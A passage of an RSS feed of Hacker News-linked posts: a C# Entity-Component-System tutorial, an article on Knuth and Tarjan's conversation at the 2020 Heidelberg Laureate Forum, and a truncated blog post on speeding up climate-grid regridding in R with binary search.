        <p>For one of my game programming classes at Ohio State I decided to implement an <a href="https://en.wikipedia.org/wiki/Entity_component_system">Entity-Component-System (ECS)</a>. A widely used pattern in game design, an ECS allows for a simpler gameobject pattern then polymorphism would. The reasons for this are discussed elsewhere<sup><a href="#fn1" id="fnref1">[1]</a></sup>, this blog post is solely for implementation.</p>
<h2>Component</h2>
<p>I'm covering Components before Entities as this is where the entire game is implemented.Components describe any behavior shared between many Entities. Examples include <code>Transform</code>, <code>Collider</code>, <code>Sprite</code>, <code>Script</code>, etc. I modelled my implemetation off of the <a href="https://docs.unity3d.com/ScriptReference/GameObject.GetComponent.html">Unity</a> style of ECS, as that's what many game programmers are used to. The implementation of the <code>Component</code> base class is exceedingly simple:</p>
<pre><code><span>class</span> <span>Component</span>
{
    <span>public</span> Entity entity;

    <span><span>public</span> <span>virtual</span> <span>void</span> <span>Update</span>(<span>GameTime gameTime</span>)</span> { }
}
</code></pre>
<p>Each component type subclasses <code>Component</code>. I'll include a <code>Transform</code> type below as an example:</p>
<pre><code><span>class</span> <span>Transform</span> : <span>Component</span>
{
    <span>public</span> Vector2 position = Vector2.Zero;
    <span>public</span> Vector2 scale = Vector2.Zero;
    <span>public</span> <span>float</span> layerDepth = <span>0</span>;
    <span>public</span> <span>float</span> rotation = <span>0</span>;
}
</code></pre>
<h2>Entity</h2>
<p>Entities are the class for any given "thing" in the scene. Your player, their weapon, the enemies, the walls, all are "entities" in this model. My <code>Entity</code> class starts with the properties below:</p>
<pre><code><span>class</span> <span>Entity</span>
{
    <span>public</span> <span>int</span> ID { <span>get</span>; <span>set</span>; }

    List&lt;Component&gt; components = <span>new</span> List&lt;Component&gt;();

    ...
}
</code></pre>
<p>The ID could be a string or <a href="https://en.wikipedia.org/wiki/Universally_unique_identifier">UUID</a>, but an <code>int</code> will work just fine for the 2D sprite-based game I'm making in this class. The <code>components</code> property references all the behaviors an entity has. Let's add some methods to this class to add a <code>Component</code> to the <code>Entity</code>:</p>
<pre><code><span>class</span> <span>Entity</span>
{
    ... 

    <span><span>public</span> <span>void</span> <span>AddComponent</span>(<span>Component component</span>)</span>
    {
        components.Add(component);
        component.entity = <span>this</span>;
    }
}
</code></pre>
<p>This method is pretty self-explanatory, the tricky (generics) part is what comes next- retrieving components. But first, why would we need to retrieve components?</p>
<h3>Sidebar: Example Character Entity</h3>
<p>If we are implementing a normal character, we'd subclass the <code>Entity</code> class and register components on it like so:</p>
<pre><code><span>class</span> <span>MyAwesomeCharacter</span> : <span>Entity</span> 
{
    <span><span>public</span> <span>MyAwesomeCharacter</span>(<span>Texture2D tex</span>)</span> 
    {
        
        Transform transform = <span>new</span> Transform();
        transform.position = <span>new</span> Vector2(<span>100</span>, <span>100</span>);
        AddComponent(transform);

        
        Sprite sprite = <span>new</span> Sprite();
        sprite.texture = tex;
        AddComponent(sprite); 
    }
}

</code></pre>
<p>Cool! Now we have a character that stores both a <code>Sprite</code> and a <code>Transform</code>. Now wouldn't it be cool if the <code>Sprite</code> could know where on the screen to draw by accessing the value of <code>Transform</code>? This is where generics come in.</p>
<h3>Retrieving Components</h3>
<p>In our implementation of the <code>Sprite</code> component above, we'd like to be able to access the values of the attached Entity's <code>Transform</code> component. It is pertinent to mention that each <code>Entity</code> should have <em>only one of each type</em> of <code>Component</code>.</p>
<pre><code><span>class</span> <span>Sprite</span> : <span>Component</span>
{
    Texture2D texture;

    <span><span>public</span> <span>virtual</span> <span>void</span> <span>Update</span>(<span><span>float</span> gameTime</span>)</span> {
        
        Transform t = entity.GetComponent&lt;Transform&gt;();
        GameEngine.DrawSprite(texture, t.position); 
    }
}
</code></pre>
<p>How would we implement this generic <code>GetComponent</code> call? It's actually not too bad using C# <a href="https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/generics/">generics</a>. See below:</p>
<pre><code><span>class</span> <span>Entity</span>
{
    ... 

    <span><span>public</span> T <span>GetComponent</span>&lt;<span>T</span>&gt;(<span></span>) <span>where</span> T : Component</span>
    {
        <span>foreach</span> (Component component <span>in</span> components)
        {
            <span>if</span> (component.GetType().Equals(<span>typeof</span>(T)))
            {
                <span>return</span> (T)component;
            }
        }
        <span>return</span> <span>null</span>;
    }
}
</code></pre>
<p>This just magically <em>works</em>. Well, it's not magic, C# just has nice <a href="https://en.wikipedia.org/wiki/Reflection_(computer_programming)">reflection</a> capabilities built in. This will allow <em>any component</em> to access <em>any other component</em> on the same Entity.</p>
<h3>Component Conclusion</h3>
<p>We now have a class <code>Component</code> that we can use to make endless reusable components that may be useful for our entities, and these components can interact with each other seamlessly.</p>
<h2>System</h2>
<p>There's one more part of ECS- the S. All game run in what's called a <a href="https://gameprogrammingpatterns.com/game-loop.html">game loop</a>, usually implemented as some sort of infinite while loop that runs every frame, updating the entire game logic then rendering to the screen. The <code>System</code> in ECS refers loosely to calling <code>Update</code> on each and every <code>Component</code> on each <code>Entity</code> in the scene. We could simply do the following:</p>
<pre><code><span>foreach</span>(Entity entity <span>in</span> scene) 
{
    <span>foreach</span>(Component component <span>in</span> entity.components)
    {
        component.Update(deltaTime)
    }
}
</code></pre>
<p>This works, but is <em>slow</em>. You of course won't run into any issues with this in a small game with 1000 objects or so but on a larger project with a couple extra orders of magnitude and this will begin to crawl.</p>
<h3>Sidebar: CPU Cache Misses</h3>
<p>A <a href="https://en.wikipedia.org/wiki/CPU_cache#Cache_miss">cache miss</a> can occur when the data referenced by an instruction isn't found in the CPU cache, so it has to be loaded from memory (this is sloooow). There are plenty<sup><a href="#fn2" id="fnref2">[2]</a></sup> <sup><a href="#fn3" id="fnref3">[3]</a></sup> of excellent presentations on why this is bad and how to address this issue, but the jist of it is that we need to store each type of <code>Component</code> in its own system. For example, when processing many collider components, the CPU can have them all in cache at once, instead of having the whole entity.</p>
<h3>System Class</h3>
<p>To address the performance concerns of an ECS, we can do some object-oriented trickery. I created a <code>BaseSystem</code> class then subclassed said class for each type of <code>Component</code> I wish to support.</p>
<pre><code><span>class</span> <span>BaseSystem</span>&lt;<span>T</span>&gt; <span>where</span> <span>T</span> : <span>Component</span>
{
    <span><span>protected</span> <span>static</span> <span>List</span>&lt;<span>T</span>&gt; components</span> = <span>new</span> List&lt;T&gt;();

    <span><span>public</span> <span>static</span> <span>void</span> <span>Register</span>(<span>T component</span>)</span>
    {
        components.Add(component);
    }

    <span><span>public</span> <span>static</span> <span>void</span> <span>Update</span>(<span>GameTime gameTime</span>)</span>
    {
        <span>foreach</span> (T component <span>in</span> components)
        {
            component.Update(gameTime);
        }
    }
}

<span>class</span> <span>TransformSystem</span> : <span>BaseSystem</span>&lt;<span>Transform</span>&gt; { }
<span>class</span> <span>SpriteSystem</span> : <span>BaseSystem</span>&lt;<span>Sprite</span>&gt; { }
<span>class</span> <span>ColliderSystem</span> : <span>BaseSystem</span>&lt;<span>Collider</span>&gt; { }
</code></pre>
<p>Now, if we make a change to our component implementations:</p>
<pre><code><span>class</span> <span>Transform</span> : <span>Component</span>
{
    ... 

    <span><span>public</span> <span>Transform</span>(<span></span>)</span> {
        TransformSystem.Register(<span>this</span>);
    }

    ... 
}
</code></pre>
<p>... we've allowed for the CPU to pull only the components it is processing. In our main game loop we can run the following for any types of components we are using:</p>
<pre><code>TransformSystem.Update(gameTime);
SpriteSystem.Update(gameTime);
ColliderSystem.Update(gameTime);
</code></pre>
<p>This will still update all our components but with better performance then the naive solution. As an added benefit, we can now be sure we update all colliders before we render all sprites, and ensure other gameplay-critical orderings remain intact.</p>
<h2>Addendum</h2>
<p>The complete code for this Entity-Component-System can be found on <a href="https://github.com/MH15/blog-examples/tree/master/ecs">Github</a>.
Please let me know if there's anything I can do to improve this ECS implementation!</p>
<h3>Footnotes</h3>
<hr>
<section>
<ol>
<li id="fn1"><p>The fantastic article on ECS at <a href="http://cowboyprogramming.com/2007/01/05/evolve-your-heirachy/">cowboyprogramming.com</a> <a href="#fnref1">‚Ü©Ô∏é</a></p>
</li>
<li id="fn2"><p>Bob Nystrom's talk on the downsides of ECS and why cache misses need to be addressed <a href="https://www.youtube.com/watch?v=JxI3Eu5DPwE">youtube.com</a> <a href="#fnref2">‚Ü©Ô∏é</a></p>
</li>
<li id="fn3"><p>Elizabeth Baumel's talk for Unity on data-oriented design <a href="https://www.youtube.com/watch?v=0_Byw9UMn9g">youtube.com</a> <a href="#fnref3">‚Ü©Ô∏é</a></p>
</li>
</ol>
</section>

    </article></div>]]>
            </description>
            <link>https://matthall.codes/blog/ecs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24591650</guid>
            <pubDate>Fri, 25 Sep 2020 16:43:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Anecdotes from Donald Knuth and Robert Tarjan]]>
            </title>
            <description>
<![CDATA[
Score 92 | Comments 12 (<a href="https://news.ycombinator.com/item?id=24591454">thread link</a>) | @furcyd
<br/>
September 25, 2020 | https://scilogs.spektrum.de/hlf/applying-mathematics-and-computer-science-to-everyday-life-anecdotes-from-donald-knuth-and-robert-tarjan/ | <a href="https://web.archive.org/web/*/https://scilogs.spektrum.de/hlf/applying-mathematics-and-computer-science-to-everyday-life-anecdotes-from-donald-knuth-and-robert-tarjan/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
    
<figure id="attachment_7848" aria-describedby="caption-attachment-7848"><a href="https://scilogs.spektrum.de/hlf/files/Screen-Shot-2020-09-22-at-12.06.55-PM.png">
<img alt="" width="342" height="114" srcset="https://scilogs.spektrum.de/hlf/files/Screen-Shot-2020-09-22-at-12.06.55-PM-300x100.png 300w, https://scilogs.spektrum.de/hlf/files/Screen-Shot-2020-09-22-at-12.06.55-PM-1024x341.png 1024w, https://scilogs.spektrum.de/hlf/files/Screen-Shot-2020-09-22-at-12.06.55-PM-768x256.png 768w, https://scilogs.spektrum.de/hlf/files/Screen-Shot-2020-09-22-at-12.06.55-PM.png 1291w" sizes="(max-width: 342px) 100vw, 342px" data-srcset="https://scilogs.spektrum.de/hlf/files/Screen-Shot-2020-09-22-at-12.06.55-PM-300x100.png 300w, https://scilogs.spektrum.de/hlf/files/Screen-Shot-2020-09-22-at-12.06.55-PM-1024x341.png 1024w, https://scilogs.spektrum.de/hlf/files/Screen-Shot-2020-09-22-at-12.06.55-PM-768x256.png 768w, https://scilogs.spektrum.de/hlf/files/Screen-Shot-2020-09-22-at-12.06.55-PM.png 1291w" data-src="https://scilogs.spektrum.de/hlf/files/Screen-Shot-2020-09-22-at-12.06.55-PM-300x100.png" src="https://scilogs.spektrum.de/hlf/files/Screen-Shot-2020-09-22-at-12.06.55-PM-300x100.png"></a><figcaption id="caption-attachment-7848">Donald Knuth and Robert Tarjan chat during the virtual HLF</figcaption></figure>
<p><span>On day two of the Virtual </span><a href="https://www.heidelberg-laureate-forum.org/"><span>Heidelberg Laureate Forum</span></a><span> (HLF) 2020, Robert Endre Tarjan and Donald Ervin Knuth engaged in a freewheeling conversation about mathematics, computer science, and art.&nbsp;</span></p>
<p><a href="https://www.heidelberg-laureate-forum.org/laureate/donald-ervin-knuth.html"><span>Donald Knuth</span></a><span> was the 1974 </span><a href="https://amturing.acm.org/"><span>ACM A.M. Turing Award</span></a><span> winner for ‚Äúfor his major contributions to the analysis of algorithms and the design of programming languages, and in particular for his contributions to the ‚Äúart of computer programming‚Äù through his well-known books in a continuous series by this title,‚Äù while </span><a href="https://www.heidelberg-laureate-forum.org/laureate/robert-endre-tarjan.html"><span>Robert Tarjan</span></a><span>, won the </span><a href="https://www.mathunion.org/imu-awards/rolf-nevanlinna-prize"><span>Nevanlinna Prize</span></a><span> in 1982 ‚Äúfor devising near-optimal algorithms for many graph-theoretic and geometric problems for the development and exploitation of data structures supporting efficient algorithms, and for contributing several algorithmic analyses of striking profundity and elegance‚Äù and the Turing Award in 1986 ‚Äúwith </span><a href="https://en.wikipedia.org/wiki/John_Hopcroft"><span>John E. Hopcroft</span></a><span>, for fundamental achievements in the design and analysis of algorithms and data structures.‚Äù</span></p>
<p><span>Tarjan was a student of Knuth‚Äôs at Stanford, and their history together was on display in their dynamic banter. The conversation produced a number of entertaining anecdotes, such as Knuth‚Äôs concern for Tarjan‚Äôs health when he was an assistant professor. Knuth said of Tarjan, ‚Äúas I sort of remember‚Ä¶I was very worried about you because you were proving theorems in your head as you were driving the freeways and I was afraid you would get into a wreck.‚Äù Remember kids, don‚Äôt do math and drive.&nbsp;</span></p>
<p><span>Knuth also discussed his time as the manager of the </span><a href="https://ohiohistorycentral.org/w/Case_Institute_of_Technology"><span>Case Institute of Technology</span></a><span> basketball team while he was an undergraduate. During his junior year he created a process to keep better statistics on each basketball player during practices and games. Then, using punch cards, he fed this data into an </span><a href="https://en.wikipedia.org/wiki/IBM_650"><span>IBM 650</span></a><span> to generate strategic recommendations for the coach of the team. This system seems to have been a success ‚Äî Case won more games the year they began to use Knuth‚Äôs system than they did the year before. IBM even recorded a short film about Knuth‚Äôs system called </span><i><span>The Electronic Coach</span></i><span>, which you can watch on Youtube </span><a href="https://www.youtube.com/watch?v=dhh8Ao4yweQ"><span>here</span></a><span>.&nbsp;</span></p>
<p><span>Knuth was ahead of his time ‚Äî modern NBA teams rely on detailed data analytics to better understand their players and the competition; in fact during the 2013-2014 season the NBA </span><a href="https://www.engadget.com/2013-09-07-nba-stats-llc-motion-tracking-sportvu.html"><span>installed SportVu motion tracking cameras</span></a><span> in every NBA stadium. These SportVu cameras monitor the movements of every player and the basketball at 25 frames per second, generating data about everything that happens in every basketball game. NBA teams, </span><a href="https://digital.hbs.edu/platform-digit/submission/moreyball-the-houston-rockets-and-analytics/"><span>most famously the Houston Rockets</span></a><span>, have used these analytics to redefine how the game is played. While three point shots are the toughest shot to make, they have a higher expected value than a long two point shot (because the difference in shooting percentage between the two is marginal), increase the spacing between players (which makes it harder to play defense), and increases the likelihood of getting an offensive rebound (because missed three point shots tend to bounce further away from the basket). Realizing this, NBA teams consistently shoot more and more threes every season. In the 1979-1980 season, the first year the three point line was introduced to the NBA, the San Diego Clippers </span><a href="https://www.basketball-reference.com/leagues/NBA_1980.html"><span>led the league</span></a><span> with 6.6 three point attempts (3PA) per game. Last year the Houston Rockets smashed that number, attempting the most threes in NBA history with </span><a href="https://www.basketball-reference.com/leagues/NBA_2019.html"><span>45.4 attempts per game</span></a><span>.&nbsp;</span></p>
<p><span>This is all to say that Knuth was really onto something when he had the novel idea of using a computer to better understand a basketball game. You can learn more about the work of a NBA modern data scientist in this video from </span><a href="https://www.youtube.com/watch?v=MpLHMKTolVw"><span>Bloomberg</span></a><span> that profiles </span><a href="https://www.linkedin.com/in/ivana-seric-503b4731/"><span>Ivana Seric</span></a><span>, a senior researcher with the Philadelphia 76ers.&nbsp;</span></p>
<figure id="attachment_7851" aria-describedby="caption-attachment-7851"><a href="https://scilogs.spektrum.de/hlf/files/Screen-Shot-2020-09-24-at-1.08.50-PM.png">
<img alt="" width="300" height="154" srcset="https://scilogs.spektrum.de/hlf/files/Screen-Shot-2020-09-24-at-1.08.50-PM-300x154.png 300w, https://scilogs.spektrum.de/hlf/files/Screen-Shot-2020-09-24-at-1.08.50-PM-1024x524.png 1024w, https://scilogs.spektrum.de/hlf/files/Screen-Shot-2020-09-24-at-1.08.50-PM-768x393.png 768w, https://scilogs.spektrum.de/hlf/files/Screen-Shot-2020-09-24-at-1.08.50-PM-1536x786.png 1536w, https://scilogs.spektrum.de/hlf/files/Screen-Shot-2020-09-24-at-1.08.50-PM-2048x1048.png 2048w" sizes="(max-width: 300px) 100vw, 300px" data-srcset="https://scilogs.spektrum.de/hlf/files/Screen-Shot-2020-09-24-at-1.08.50-PM-300x154.png 300w, https://scilogs.spektrum.de/hlf/files/Screen-Shot-2020-09-24-at-1.08.50-PM-1024x524.png 1024w, https://scilogs.spektrum.de/hlf/files/Screen-Shot-2020-09-24-at-1.08.50-PM-768x393.png 768w, https://scilogs.spektrum.de/hlf/files/Screen-Shot-2020-09-24-at-1.08.50-PM-1536x786.png 1536w, https://scilogs.spektrum.de/hlf/files/Screen-Shot-2020-09-24-at-1.08.50-PM-2048x1048.png 2048w" data-src="https://scilogs.spektrum.de/hlf/files/Screen-Shot-2020-09-24-at-1.08.50-PM-300x154.png" src="https://scilogs.spektrum.de/hlf/files/Screen-Shot-2020-09-24-at-1.08.50-PM-300x154.png"></a><figcaption id="caption-attachment-7851">Typeset score from Chapter 1 of Fantasia Apocalyptica</figcaption></figure>
<p><span>Knuth‚Äôs application of math and computer science to other fields doesn‚Äôt stop there. Knuth is also an accomplished pipe organ player and a few years ago he composed, </span><a href="https://www-cs-faculty.stanford.edu/~knuth/fant.html"><i><span>Fantasia Apocalyptica</span></i></a><span>, a multimedia work for pipe organ. In </span><i><span>Apocalyptica </span></i><span>Knuth used a few mathematical and algorithmic methods to generate melodies. </span><a href="https://www-cs-faculty.stanford.edu/~knuth/fant.html"><span>On his webpage</span></a><span> Knuth says:</span></p>
<p><span>‚ÄúAt one point I thought I might have time to understand music theory well enough that I could try to teach that theory to a computer. But eventually I concluded that it would be better to create this piece almost entirely by hand, using my desktop machine only to help organize the work. Thus it‚Äôs definitely </span><i><span>not</span></i><span> ‚Äúcomputer music‚Äù, although I do profess to be a computer scientist.</span></p>
<p><span>On the other hand, I did apply some algorithms manually in a few places. For example, a haunting melody, taken from one of the earliest surviving instances of ancient Greek music, occurs ten times. I harmonized it differently each time, using the algorithm of David Kraehenbuehl that‚Äôs described in Chapter 22 of </span><a href="https://www-cs-faculty.stanford.edu/~knuth/fg.html"><span>Selected Papers on Fun &amp; Games</span></a><span>. (See </span><a href="https://www-cs-faculty.stanford.edu/~knuth/papers/randomness.ps.gz"><span>‚ÄúRandomness in Music‚Äù</span></a><span>.)</span></p>
<p><span>Mathematical methods were also used to generate the changeringing patterns that appear briefly, as well as certain melodies used for the twelve tribes of Israel and for the twelve precious jewels below the ‚Äúpearly gates‚Äù of the New Jerusalem. If those methods hadn‚Äôt been successful, I would have changed the results by hand. Fortunately, I didn‚Äôt have to do that; the algorithmic approach did give a pleasing result in those cases.‚Äù</span></p>
<p><span>Knuth‚Äôs diverse interests led Tarjan to ask a compelling question: ‚ÄúIt‚Äôs been said that any field that has science in its name is not a science, so I might ask you is computer science a science, a branch of engineering, a branch of mathematics, an art ‚Äî but let me ask it in a more personal way‚Ä¶.do you see yourself as an artist, a scientist, a mathematician, an engineer, a philosopher, some combination?‚Äù&nbsp;</span></p>
<p><span>Knuth replied that he realized art stands not only for fine art but also for things that are artificial or made by human beings (as opposed to nature). He defined science as ‚Äúwhat we understand well enough to explain to a computer‚Äù while ‚Äúart is everything else.‚Äù He went on to say that as we learn more science about something our brains ‚Äúkeep a few jumps ahead, and that‚Äôs the art.‚Äù&nbsp;</span></p>
<p><span>Finally, Knuth was asked if he had advice for students. Knuth‚Äôs response was to echo the </span><a href="https://scilogs.spektrum.de/hlf/have-fun-life-and-career-advice-from-sir-c-antony-r-hoare-and-leslie-lamport/"><span>advice of Leslie Lamport</span></a><span> from earlier in HLF, which was to write often. However, Knuth cautioned to not be ‚Äútoo influenced by trendy stuff. Don‚Äôt write a paper because you have to write a paper or because you think you have to impress people about something that you aren‚Äôt personally really interested in‚Ä¶that‚Äôs the worst reason to write a paper.‚Äù&nbsp;</span></p>
<p><span>Tarjan added to this and said, ‚ÄúYou have to figure out what your own path is and follow it. The best students I‚Äôve had came in with or ended up with their own idea that they developed.‚Äù Clearly both men have had success finding and following their own path. </span><b>Watch the full conversation between Tarjan and Knuth on Youtube </b><a href="https://www.youtube.com/watch?v=O5g4Zl8ppQA"><b>here</b></a><b>. </b></p>


</div></div>]]>
            </description>
            <link>https://scilogs.spektrum.de/hlf/applying-mathematics-and-computer-science-to-everyday-life-anecdotes-from-donald-knuth-and-robert-tarjan/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24591454</guid>
            <pubDate>Fri, 25 Sep 2020 16:24:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[14000x Speedup (2015)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24591331">thread link</a>) | @optimalsolver
<br/>
September 25, 2020 | http://james.hiebert.name/blog/work/2015/09/14/CS-FTW.html | <a href="https://web.archive.org/web/*/http://james.hiebert.name/blog/work/2015/09/14/CS-FTW.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>In my job as a scientific software developer, I tend to write a lot of code. And most people who haven‚Äôt been through a Computer Science degree tend to think that CS is ‚Äújust‚Äù about slinging code at the screen and then running it. I have a good working relationship with many of my colleagues and co-workers with other backgrounds‚Ä¶ Physics, Climate Science, Biology, etc. But when it comes to developing software, I get the distinct impression that people think, ‚ÄúHey, how hard could this be?! We just write down a few instructions about what we want the computer to do, hit the execute button and the, ‚ÄòBlamo!‚Äô, we get our answer!‚Äù</p>

<p>The problem with that line of thinking is that it‚Äôs incredibly easy to write instructions that don‚Äôt mean what you think they mean. For example, your program could be completely uninterpretable by the computer. Furthermore, there is literally <a href="https://en.wikipedia.org/wiki/Halting_problem">no way to tell whether your program will ever actually terminate</a> without actually executing it. And there are many, many, <em>many</em>, ways to write a program which make it ‚Äúslow‚Äù to execute. ‚ÄúSlow‚Äù being‚Ä¶ like <em>really</em> slow. Like it would take your entire lifetime or more to actually execute it. This final problem is one that I see most often when reading software written by people without a CS education. And fixing that is my job.</p>

<p>The thing about CS that people don‚Äôt realize is that it teaches you about the theory of computation, computability (i.e. can we actually compute something? We often take for granted that we can!), algorithm complexity, and all of the knowledge, logic and analysis techniques and help you compose a program that will run in the minimum amount of time or using the minimum amount of space.</p>

<p>Allow me to show you an example of a huge optimization that I made to a simple script written by a colleague.</p>

<p>In climate science we do a lot of downscaling. We take temperature and precipitation readings from a coarse scale Global Climate Model grid and map them to a fine scale local grid. Let‚Äôs say the global grid is 50x25 and the local grid is 1000x500. For each grid cell in the local grid, we want to know to which grid cell in the global grid it corresponds.</p>

<p>A simple way to think about this is that we want to minimize the distance between L[n] and G[n]. So a simple way to do the search would be:</p>

<pre><code>for each Local cell L[i]:
  for each Global cell G[j]:
     compute distance between L[i] and G[j]
  find the minimum distance in the set L[i] * G
  return the index of the minimum
</code></pre>

<p>It seems simple enough. However, if you look closely, you‚Äôll notice that you have to do a <em>lot</em> of extra work. Look at the algorithm in terms of the size of the input.</p>

<pre><code>for each Local cell L[i]:                        # Do this L times
  for each Global cell G[j]:                     # Do this L x G times
     compute distance (d) between L[i] and G[j]  # Do this L x G times
  find the minimum distance in the set d[i*j]    # Read G cells L times (cost L x G)
  find the index whose cell matches the minimum  # Read G cells L times (cost L x G)
</code></pre>

<p>The code for this looked something like this:</p>

<pre><code>obs.lon &lt;- ncvar_get(nc.obs, 'lon')
obs.lat &lt;- ncvar_get(nc.obs, 'lat')
n.lon &lt;- length(obs.lon)
n.lat &lt;- length(obs.lat)

obs.lats &lt;- matrix(obs.lat, nrow=n.lon, ncol=n.lat, byrow=TRUE)
obs.lons &lt;- matrix(obs.lon, nrow=n.lon, ncol=n.lat)
obs.time &lt;- netcdf.calendar(nc.obs)

gcm.lon &lt;- ncvar_get(nc.gcm, 'lon')-360
gcm.lat &lt;- ncvar_get(nc.gcm, 'lat')
gcm.lats &lt;- matrix(gcm.lat, ncol=length(gcm.lat), nrow=length(gcm.lon),
                   byrow=TRUE)
gcm.lons &lt;- matrix(gcm.lon, ncol=length(gcm.lat), nrow=length(gcm.lon))
gcm.lons.lats &lt;- cbind(c(gcm.lons), c(gcm.lats))

# Figure out which GCM grid boxes are associated with each fine-scale grid point
# Confine search to 10 deg. x 10 deg. neighbourhood

dxy &lt;- 10
mdist &lt;- function(x, y)
    apply(abs(sweep(data.matrix(y), 2, data.matrix(x), '-')), 1, sum)
nn &lt;- list()
for (i in seq_along(obs.lons)) {
    if((i %% 500)==0) cat(i, '')
    gcm.lims &lt;- ((gcm.lons.lats[,1] &gt;= (obs.lons[i]-dxy)) &amp;
                 (gcm.lons.lats[,1] &lt;= (obs.lons[i]+dxy))) &amp;
                ((gcm.lons.lats[,2] &gt;= (obs.lats[i]-dxy)) &amp;
                 (gcm.lons.lats[,2] &lt;= (obs.lats[i]+dxy)))
    gcm.lims &lt;- which(gcm.lims)
    nn.min &lt;- which.min(mdist(c(obs.lons[i], obs.lats[i]),
                        gcm.lons.lats[gcm.lims,]))
    nn[[i]] &lt;- gcm.lims[nn.min]
}
nn &lt;- unlist(nn)
</code></pre>

<p>So, it seems like a simple algorithm. ‚ÄúJust‚Äù compute the distances and then find the minimum. But the way it was written, as the size of the number of local cells grows, our cost of computation grows by its product with the number of global grid cells. For Canadian ANUSPLIN data, there are 1068 x 510 cells (for a total of 544,680) and let‚Äôs say that our GCM has 50 x 25 cells (for a total of 1,250 cells). So the cost of the inner loop in ‚Äúsome computational unit‚Äù is:</p>



<p>where the  terms are constants that correspond to the cost of computing a distance between two points, finding the minimum point, and finding an array index. Really, we don‚Äôt care (much) about the constant terms, because they are not affected by the size of the input. So we can just clump them together and call the cost;</p>



<p>So for this set of input, our cost is </p>

<p>680 million.</p>

<p>That <em>seems</em> like a lot, but is it? Computers are fast, right? If we run the naive implementation that‚Äôs something like this:</p>

<p>it ends up taking 1668 seconds which is a little less than half an hour.</p>

<pre><code>&gt; source('BCCA/naive.implementation.R')
500 1000 1500 2000 2500 3000 ... 543000 543500 544000 544500 [1] "Elapsed Time"
    user   system  elapsed 
1668.868    8.926 1681.728 
</code></pre>

<p>But do we <em>need</em> for it to take 30 minutes? Here‚Äôs the thing. We‚Äôre comparing two grids together, both of which have tons of structure that we haven‚Äôt taken advantage of. For example the latitudes and longitudes in both the coarse and the fine grid are in sorted order. So if you want to search for a number, you don‚Äôt have to look at every single number. You can use a bisect algorithm where you look at the point in the middle and then decide which half of the array you want to search. Then searching the full space only costs you the log (base 2) of the search space.</p>

<p>The other major structure that we haven‚Äôt taken advantage of is the fact that the latitudes repeat themselves in the  dimension and the longitudes repeat themselves in the  dimension. So instead of doing an operation  times, we can do it  times. That‚Äôs a <em>huge</em> optimization.</p>

<p>What does that look like in pseudo-code?</p>

<pre><code>For each local[x]:
    bisect_search(local[x], Global[x])

For each local[y]:
    bisect_search(local[y], Global[y])

return a 2d grid of the search results for each dimension
</code></pre>

<p>In code:</p>

<pre><code>## Perform a binary search on the *sorted* vector v
## Return the array index of the element closest to x
find.nearest &lt;- function(x, v) {
    if (length(v) == 1) {
        return(1)
    }
    if (length(v) == 2) {
        return(which.min(abs(v - x)))
    }
    mid &lt;- ceiling(length(v) / 2)
    if (x == v[mid]) {
        return(mid)
    } else if (x &lt; v[mid]) {
        return(find.nearest(x, v[1:mid]))
    }
    else {
        return((mid - 1) + find.nearest(x, v[mid:length(v)]))
    }
}

regrid.one.dim &lt;- function(coarse.points, fine.points) {
    return(sapply(fine.points, find.nearest, coarse.points))
}

## Take a fine scale (e.g. ANUSPLINE) grid of latitudes and longitudes
## and find the indicies that correspond to a coarse scale (e.g. a GCM) grid
## Since the search is essentially a minimizing distance in 2 dimensions
## We can actually search independently in each dimensions separately (which
## is a huge optimization, making the run time x + y instead of x * y) and
## then reconstruct the indices to create a full grid
regrid.coarse.to.fine &lt;- function(coarse.lats, coarse.lons, fine.lats, fine.lons) {
    xi &lt;- regrid.one.dim(gcm.lon, obs.lon)
    yi &lt;- regrid.one.dim(gcm.lat, obs.lat)
    ## Two dimensional grid of indices
    xi &lt;- matrix(xi, ncol=length(fine.lats), nrow=length(fine.lons), byrow=F)
    yi &lt;- matrix(yi, ncol=length(fine.lats), nrow=length(fine.lons), byrow=T)
    return(list(xi=xi, yi=yi))
}

</code></pre>

<p>The cost for every bisection search is the log of the input size. Our input size is divided into X and Y space this time, so we‚Äôll use , and  for Global, Local, X and Y.</p>



<p>Plugging in our numbers this gives us a cost estimate of 553,076. 553 thousand sounds a lot better than 680 million. Do we see that in the run time?</p>

<pre><code>&gt; ptm &lt;- proc.time(); rv &lt;- regrid.coarse.to.fine(gcm.lat, gcm.lon, obs.lat, obs.lon); print('Elapsed Time'); print(proc.time() - ptm)[1] "Elapsed Time"
   user  system elapsed 
  0.117   0.000   0.117 
&gt; str(rv)
List of 2
 $ xi: num [1:1068, 1:510] 15 15 15 15 15 15 15 15 15 15 ...
 $ yi: num [1:1068, 1:510] 13 13 13 13 13 13 13 13 13 13 ...
&gt; 
</code></pre>

<p>0.117 seconds. What took us almost half an hour before, now takes us a little over  of a second.</p>

<pre><code>&gt; 1668.868 / .117
[1] 14263.83
</code></pre>

<p>Soooooo‚Ä¶ I know that I‚Äôm trained to do this kind of work and it‚Äôs my job to know how to do these types of things. But even <em>I‚Äôm</em> surprised and self-impressed at how significant that speedup is. That‚Äôs a <em>14 thousand times</em> speedup.</p>

<p>This script used to take so long that it had to save its output to disk and be manually checked by a scientist before proceeding. Now you can compute it in the blink of an eye. This is a computation that we have to do hundreds of times, and this saves us days to weeks of computation time. And it increases the ability to interact with the system, helping us to get more value out of our scientists‚Äô time‚Ä¶ they‚Äôre not sitting around waiting for a computation to finish. It just does it.</p>

<p>I should emphasize that these epic performance improvements come without buying any larger computer systems, no parallelization or increase in complexity‚Ä¶ in fact the code for the faster algorithm is actually simpler and more reusable! It‚Äôs pretty much an all around win, just by reading the code and having ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://james.hiebert.name/blog/work/2015/09/14/CS-FTW.html">http://james.hiebert.name/blog/work/2015/09/14/CS-FTW.html</a></em></p>]]>
            </description>
            <link>http://james.hiebert.name/blog/work/2015/09/14/CS-FTW.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24591331</guid>
            <pubDate>Fri, 25 Sep 2020 16:13:33 GMT</pubDate>
        </item>
